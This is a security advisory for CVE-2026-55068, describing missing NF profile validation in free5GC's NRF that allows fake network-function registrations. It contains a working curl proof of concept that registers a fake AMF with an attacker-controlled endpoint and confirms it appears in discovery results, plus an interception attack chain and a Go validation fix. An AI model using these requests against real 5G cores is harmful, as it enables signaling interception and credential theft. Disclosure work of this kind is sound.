# [C] free5GC NRF nnrf-nfm lacks NF Profile input validation — enables NF Registration Poisoning with arbitrary service endpoints

## Summary
Severity: Critical
Advisory: GHSA-x8mj-6p3q-g5pp
CVE: CVE-2026-55068
CWE: CWE-20
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-08-28
Source: https://github.com/advisories/GHSA-x8mj-6p3q-g5pp
Type: github-advisory

## Affected
- Go: `github.com/free5gc/free5gc` — affected >=0 <4.2.2

## Details
### Summary

free5GC NRF (Docker image free5gc-fuzz:latest) accepts NF registration requests without validating any field constraints against 3GPP TS 29.510, allowing unauthenticated attackers to inject fake NF profiles with arbitrary service endpoint IP addresses. All 17 constraint violations tested (UUID format, enum values, numeric ranges, mandatory fields, IP endpoint integrity) were accepted with HTTP 200/201. Legitimate NFs discover these fake profiles via NFDiscover and route control-plane traffic to attacker-controlled endpoints, an attacker with SBI network access can intercept control-plane signaling, harvest OAuth2 credentials, and deny service to subscribers.

---

### Details

free5GC NRF's `RegisterNFInstance` handler (PUT `/nnrf-nfm/v1/nf-instances/{nfInstanceID}`) accepts the full NF profile body without field-level validation. The following 3GPP TS 29.510 constraints are violated:

**Format validation**: `nfInstanceId` accepts non-UUID strings (e.g., `"not-a-uuid"`, `"11111111-1111-1111-1111-111111111111"`), violating TS 29.510 §6.1.6.2.2 UUID v4 requirement.

**Enum validation**: `nfStatus` accepts values outside the `{REGISTERED, SUSPENDED, UNDISCOVERABLE}` enum (e.g., `"INVALID_STATUS"`).

**Range validation**: `heartBeatTimer` accepts values outside the valid range [1, 3600] (e.g., `0`, `99999`), violating TS 29.510 §5.2.2.2.

**Mandatory field enforcement**: `nfProfile` is accepted as `null`, violating the required field constraint in §5.2.2.2.

**Service endpoint integrity**: `nfServices.ipEndPoints` entries are stored without any IP address validation, allowing arbitrary attacker-controlled addresses (e.g., `10.0.0.99`) to be registered as legitimate NF service endpoints.

All five failure modes return HTTP 200/201. The profiles are stored in MongoDB's `NfProfile` collection (which has no JSON schema validator) and appear in `NFDiscover` results alongside legitimate NF instances.

**Attack chain** ( OAuth is enabled):
1. A compromised NF with valid OAuth token registers a fake AMF with `nfServices.ipEndPoints` pointing to `10.0.0.99:7777`
2. NRF stores the profile and advertises it via NFDiscover
3. SMF queries NRF for AMF instances and selects the fake one
4. SMF routes N1N2 signaling to `10.0.0.99:7777`
5. Attacker intercepts control-plane traffic

**Discovery methodology**: 121 semantic constraints extracted from 10 3GPP TS 29.5xx specifications, modeled as a multi-relational interaction graph with CONDITIONAL (23 edges), CONFLICT (28 edges), and SHARED_FIELD (58 edges) relationships. 50,000 constraint-violating HTTP requests generated, 9,756 accepted-invalid responses detected, deduplicated to 17 unique violations across 5 root cause categories.


**Logging**: NRF default configuration (`LogEnable: false`) produces zero runtime log lines — 450,000 HTTP requests and 27,601 NF registrations with zero audit trail. Enabling logging records the attack but does not prevent it (validation is independent of logging).

### PoC

**No configuration changes needed.** Default free5GC deployment is vulnerable.

```bash
# Step 1: Register fake AMF with attacker-controlled IP
curl -X PUT \
  "http://172.24.0.10:8000/nnrf-nfm/v1/nf-instances/11111111-1111-1111-1111-111111111111" \
  -H "Content-Type: application/json" \
  -d '{
    "nfInstanceId": "11111111-1111-1111-1111-111111111111",
    "nfType": "AMF",
    "nfStatus": "REGISTERED",
    "heartBeatTimer": 3600,
    "plmnList": [{"mcc": "001", "mnc": "01"}],
    "sNssais": [{"sst": 1, "sd": "010203"}],
    "nfServices": [{
      "serviceInstanceId": "fake-amf-svc",
      "serviceName": "namf-comm",
      "versions": [{"apiVersionInUri": "v1", "apiFullVersion": "1.0.0"}],
      "scheme": "http",
      "nfServiceStatus": "REGISTERED",
      "ipEndPoints": [{"ipv4Address": "10.0.0.99", "port": 7777, "transport": "TCP"}]
    }]
  }'
# Returns: HTTP 201 (Accepted — profile stored with fake endpoint)

# Step 2: Confirm the profile is stored
curl "http://172.24.0.10:8000/nnrf-nfm/v1/nf-instances/11111111-1111-1111-1111-111111111111"
# Returns: HTTP 200 with fake IP 10.0.0.99:7777 in the response

# Step 3: Verify the fake AMF appears in discovery results
curl "http://172.24.0.10:8000/nnrf-disc/v1/nf-instances?target-nf-type=AMF&requester-nf-type=SMF"
# Returns: HTTP 200 — fake AMF with 10.0.0.99:7777 listed alongside real AMFs

# Additional constraint violations (all return 200/201):
curl -X PUT "http://172.24.0.10:8000/nnrf-nfm/v1/nf-instances/not-a-uuid" \
  -H "Content-Type: application/json" \
  -d '{"nfInstanceId": "not-a-uuid", "nfType": "AMF", "nfStatus": "INVALID_STATUS", "heartBeatTimer": 0}'
# Returns: HTTP 201 (non-UUID + invalid enum + out-of-range timer — ALL accepted)
```

**Expected fix**:
```go
import "github.com/google/uuid"

func validateNFProfile(profile *NFProfile) error {
    // UUID v4 validation
    if _, err := uuid.Parse(profile.NfInstanceId); err != nil {
        return fmt.Errorf("nfInstanceId must be valid UUID v4")
    }
    // Enum validation
    validStatuses := map[string]bool{"REGISTERED": true, "SUSPENDED": true, "UNDISCOVERABLE": true}
    if !validStatuses[profile.NfStatus] {
        return fmt.Errorf("nfStatus must be REGISTERED, SUSPENDED, or UNDISCOVERABLE")
    }
    // Range validation
    if profile.HeartBeatTimer < 1 || profile.HeartBeatTimer > 3600 {
        return fmt.Errorf("heartBeatTimer must be between 1 and 3600")
    }
    return nil
}
// Return HTTP 400 with ProblemDetails on validation failure
```

### Impact

| Property | Value |
|----------|-------|
| **Authentication** | None required  |
| **Impact** | Control-plane traffic interception, OAuth2 credential harvesting, denial of service |
| **Affected component** | free5GC NRF Docker image free5gc-fuzz:latest |
| **Affected implementations** | All NFs that use NFDiscover (AMF, SMF, AUSF, UDM, PCF, NSSF) — the fake profile propagates to the entire 5GC service mesh |
| **Fix** | Add UUID/enum/range/required-field validation to RegisterNFInstance handler; return HTTP 400 with ProblemDetails on failure |
| **Status** | Reported to maintainers |

**Scope of impact**: Unlike denial-of-service attacks (SIGABRT/SIGSEGV) that only affect a single Network Function (NF), this vulnerability can impact **all NFs** within the 5GC service mesh. Once a forged NF profile is registered, any NF querying the NRF for service discovery may be redirected to an attacker-controlled endpoint. The 27,601 profiles registered during testing fully demonstrate the automated scale achievable by such an attack.

**Environment**: free5GC Docker image free5gc-fuzz:latest, Docker Compose, Ubuntu 22.04, kernel 6.8.0-111, bridge network 172.24.0.0/24.

## References
- https://github.com/free5gc/free5gc/security/advisories/GHSA-x8mj-6p3q-g5pp
- https://github.com/free5gc/free5gc/issues/1056
- https://github.com/free5gc/nrf/pull/90
- https://github.com/free5gc/nrf/commit/bda0cf75be5556bb4c758c8b34710f3fe6bbe3ea
- https://github.com/free5gc/nrf/commit/fcd3cfaa27cc4dc17172ee0c4c3e0a3a696297c6
- https://github.com/free5gc/free5gc
- https://github.com/free5gc/free5gc/releases/tag/v4.2.3
- https://github.com/free5gc/nrf/releases/tag/v1.4.5
